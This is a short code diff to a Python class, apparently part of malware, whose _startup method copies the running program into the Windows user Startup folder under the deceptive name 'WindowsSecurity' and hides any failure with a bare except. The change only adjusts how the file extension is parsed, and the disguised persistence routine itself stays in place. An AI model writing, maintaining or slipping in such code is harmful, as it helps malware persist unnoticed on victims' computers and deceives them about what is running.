@@ -6,6 +6,6 @@ class Startup:
     
     def _startup(self):
         try:
-            with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.{self.file.split("\\")[-1].split(".")[-1]}', 'wb') as f:
+            with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.{self.file.split("/")[-1].split(".")[-1]}', 'wb') as f:
                 f.write(open(self.file, 'rb').read())
         except:pass
